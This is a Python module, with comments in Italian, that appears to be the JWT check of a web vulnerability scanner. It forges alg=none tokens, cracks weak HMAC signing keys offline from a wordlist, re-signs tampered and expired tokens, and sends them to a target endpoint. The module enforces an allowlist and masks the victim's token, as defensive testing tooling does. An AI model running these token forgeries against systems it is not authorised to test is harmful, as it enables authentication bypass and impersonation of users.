"""Lane JWT — debolezze classiche nella verifica dei token (puro Python, stdlib).

Serve un token valido (quello che l'utente legittimo già possiede) e l'endpoint
protetto che lo accetta. La lane NON indovina: forgia richieste concrete e guarda
cosa risponde il server, oppure fa matematica offline sulla firma. Tre controlli
oggettivi:

  1. alg=none  — forgia un token con header {"alg":"none"} e firma VUOTA (nelle
     varianti none/None/NONE/nOnE). Se il server lo accetta (stesso 200 del token
     valido) non verifica la firma → chiunque può coniare token → CRITICO.

  2. chiave HS* debole — se l'alg è HMAC (HS256/384/512), rifà l'HMAC su
     `header.payload` per ogni voce di una wordlist piccola e la confronta con la
     firma reale. Se una combacia, la chiave di firma è indovinabile → ogni token
     è forgiabile → ALTO. (Confronto 100% offline: nessuna richiesta.)

  3. `exp` ignorata — se abbiamo la chiave (crackata) o alg=none è passato, forgia
     un token per il resto valido ma SCADUTO e lo manda. Se il server lo accetta,
     non controlla la scadenza → MEDIO.

Confine: `probe()` impone l'ALLOWLIST. Onestà sui token: il JWT della VITTIMA non
finisce mai nel referto; i PoC `curl` mascherano il Bearer con `$TOKEN` (come la
lane idor) e l'evidenza descrive la ricetta della forgiatura, non la credenziale.
"""

import base64
import hashlib
import hmac
import json
import os
import time

from core import finding, probe, as_curl, SEV_ORDER

_HERE = os.path.dirname(os.path.abspath(__file__))
_DEFAULT_WL = os.path.join(_HERE, "wordlists", "jwt-secrets.txt")

# gli HMAC supportati da JWT → funzione hashlib corrispondente
_HS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


# --- base64url (JWT) senza padding ------------------------------------------
def _b64url_decode(s):
    s = s.encode() if isinstance(s, str) else s
    return base64.urlsafe_b64decode(s + b"=" * (-len(s) % 4))


def _b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _json_b64(obj):
    """Serializza compatto (come fanno le librerie JWT) e codifica base64url."""
    return _b64url_encode(json.dumps(obj, separators=(",", ":"), sort_keys=False).encode())


def _decode(token):
    """Spacchetta un JWT a 3 parti → (header, payload, h_b64, p_b64, s_b64) o None."""
    parts = str(token).split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return header, payload, parts[0], parts[1], parts[2]


def _sign_hs(header, payload, secret, alg):
    """Firma (header, payload) in HMAC-`alg` con `secret` → token completo."""
    h = dict(header)
    h["alg"] = alg
    signing_input = _json_b64(h) + "." + _json_b64(payload)
    mac = hmac.new(secret.encode(), signing_input.encode(), _HS[alg]).digest()
    return signing_input + "." + _b64url_encode(mac)


def _forge_none(payload, variant="none"):
    """Token con alg=none e firma vuota (header.payload. — terza parte assente)."""
    return _json_b64({"alg": variant, "typ": "JWT"}) + "." + _json_b64(payload) + "."


def _load_wordlist(path):
    try:
        with open(path or _DEFAULT_WL, encoding="utf-8", errors="replace") as f:
            out = []
            for line in f:
                w = line.rstrip("\n")
                if w and not w.lstrip().startswith("#"):
                    out.append(w)
            return out
    except OSError:
        return []


def _crack_hs(h_b64, p_b64, s_b64, alg, wordlist):
    """Brute OFFLINE: quale voce della wordlist riproduce la firma reale?"""
    signing_input = (h_b64 + "." + p_b64).encode()
    want = s_b64
    for secret in wordlist:
        mac = hmac.new(secret.encode(), signing_input, _HS[alg]).digest()
        if hmac.compare_digest(_b64url_encode(mac), want):
            return secret
    return None


def _tamper(payload):
    """Payload modificato (prova di forgiatura di un'identità diversa)."""
    p = dict(payload)
    for k in ("sub", "user", "username", "uid", "id", "role"):
        if k in p:
            p[k] = "aries-forged"
            return p
    p["aries"] = "forged"
    return p


def jwt_audit(url, token, wordlist=None, method="GET"):
    """Esegue i tre controlli e ritorna la lista dei finding (uno per controllo)."""
    parsed = _decode(token)
    if not parsed:
        return [finding("jwt", url, "inconcludente", "info",
                        "il valore fornito non è un JWT a tre parti (header.payload.firma)",
                        f"token: {str(token)[:24]}…")]
    header, payload, h_b64, p_b64, s_b64 = parsed
    alg = str(header.get("alg", ""))
    auth = {"Authorization": f"Bearer {token}"}
    repro_auth = {"Authorization": "Bearer $TOKEN"}   # il JWT vittima NON va nel referto

    # baseline: il token valido deve essere accettato (altrimenti non so leggere i 200)
    r_base = probe(url, method, auth)
    base_ok = "error" not in r_base and r_base.get("status") == 200

    # GUARDIA negativa — il server verifica DAVVERO le firme? Forgio un token con la
    # stessa testa/payload ma firma ROTTA (byte arbitrari, nessun segreto la produce)
    # e lo mando. Se è RIFIUTATO (≠ 200), l'endpoint verifica le firme → i controlli
    # online (alg=none, exp, conferma della chiave debole) sono ATTRIBUIBILI a un
    # bypass. Se invece è ACCETTATO come il valido, il server NON verifica le firme
    # (o l'endpoint non è protetto): l'accettazione di un token forgiato non prova
    # nulla → la lane TACE su quei controlli (stessa logica della guardia D del CSRF,
    # del canary SSRF, dell'esca del mass-assign). È un fatto OGGETTIVO (una richiesta
    # di controllo), non un parere.
    sig_enforced = False
    if base_ok:
        broken = h_b64 + "." + p_b64 + "." + _b64url_encode(b"aries-invalid-sig-control")
        r_broken = probe(url, method, {"Authorization": f"Bearer {broken}"})
        sig_enforced = "error" not in r_broken and r_broken.get("status") != 200
    out = []

    # --- 1. chiave HS* debole (offline) -------------------------------------
    if alg.upper() in _HS:
        wl = _load_wordlist(wordlist)
        secret = _crack_hs(h_b64, p_b64, s_b64, alg.upper(), wl)
        if secret is not None:
            confirmed = ""
            if sig_enforced:                         # conferma lato server: token rifirmato
                forged = _sign_hs(header, _tamper(payload), secret, alg.upper())
                rr = probe(url, method, {"Authorization": f"Bearer {forged}"})
                if "error" not in rr and rr.get("status") == 200:
                    confirmed = " · il server accetta un token rifirmato (HTTP 200)"
            out.append(finding(
                "jwt:weak-secret", url, "VULNERABILE (chiave HS debole)", "high",
                f"la chiave {alg.upper()} è una voce di wordlist comune → ogni token è forgiabile",
                f"chiave indovinata: '{secret}' ({len(wl)} tentativi offline){confirmed}",
                as_curl(url, method, repro_auth)))
        else:
            out.append(finding(
                "jwt:weak-secret", url, "chiave HS robusta", "ok",
                f"nessuna voce della wordlist riproduce la firma {alg.upper()} (chiave non indovinata)",
                f"{len(wl)} candidati provati offline, nessun match"))

    # --- 2. alg=none (online) -----------------------------------------------
    if sig_enforced:
        accepted = None
        for variant in ("none", "None", "NONE", "nOnE"):
            forged = _forge_none(payload, variant)
            rr = probe(url, method, {"Authorization": f"Bearer {forged}"})
            if "error" not in rr and rr.get("status") == 200:
                accepted = variant
                break
        if accepted is not None:
            out.append(finding(
                "jwt:alg-none", url, "VULNERABILE (alg=none)", "crit",
                "il server accetta un token con alg=none e firma vuota → nessuna verifica di firma",
                f"header forgiato {{\"alg\":\"{accepted}\"}}, payload invariato, firma assente → HTTP 200",
                as_curl(url, method, repro_auth)))
        else:
            out.append(finding(
                "jwt:alg-none", url, "alg=none respinto", "ok",
                "il token con alg=none e firma vuota viene rifiutato (verifica della firma presente)",
                "varianti provate: none/None/NONE/nOnE → tutte respinte"))
    elif base_ok:
        # Il token valido è accettato ma anche una firma ROTTA lo è → l'endpoint non
        # verifica le firme (o non è protetto): l'eventuale accettazione di alg=none
        # NON sarebbe attribuibile a un bypass → la lane tace (guardia anti-FP).
        out.append(finding(
            "jwt:alg-none", url, "non attribuibile (firma non verificata)", "ok",
            "il server accetta anche un token con firma ARBITRARIA (rotta) → non "
            "verifica le firme o l'endpoint non è protetto: un eventuale 200 su "
            "alg=none non proverebbe un bypass → nessun verdetto attribuibile",
            "token di controllo con firma rotta accettato (HTTP 200) come il valido"))

    # --- 3. exp ignorata (serve poter firmare: chiave crackata o alg=none) ---
    exp_secret = None
    for f in out:
        if f["check"] == "jwt:weak-secret" and "VULNERABILE" in f["verdict"]:
            exp_secret = _crack_hs(h_b64, p_b64, s_b64, alg.upper(),
                                   _load_wordlist(wordlist))
    none_ok = any(f["check"] == "jwt:alg-none" and "VULNERABILE" in f["verdict"] for f in out)
    if sig_enforced and (exp_secret is not None or none_ok):
        expired = dict(payload)
        expired["exp"] = 1000000000              # 2001-09-09 → abbondantemente scaduto
        if exp_secret is not None:
            tok = _sign_hs(header, expired, exp_secret, alg.upper())
        else:
            tok = _forge_none(expired)
        rr = probe(url, method, {"Authorization": f"Bearer {tok}"})
        if "error" not in rr and rr.get("status") == 200:
            out.append(finding(
                "jwt:exp", url, "VULNERABILE (exp ignorata)", "med",
                "il server accetta un token per il resto valido ma con exp nel 2001 → scadenza non verificata",
                "token rifirmato con exp=1000000000 (scaduto) → HTTP 200",
                as_curl(url, method, repro_auth)))

    # nessun controllo applicabile (es. alg non HMAC e server non raggiungibile)
    if not out:
        out.append(finding("jwt", url, "inconcludente", "info",
                           "token non HMAC e nessun 200 di riferimento: controlli non applicabili",
                           f"alg={alg or '?'} · baseline status={r_base.get('status', r_base.get('error'))}"))
    return out


def _worst(findings):
    """Il finding più grave (per il benchmark a faccia singola)."""
    return min(findings, key=lambda f: SEV_ORDER.get(f["severity"], 9))


def run(url, token, wordlist=None):
    return jwt_audit(url, token, wordlist=wordlist)
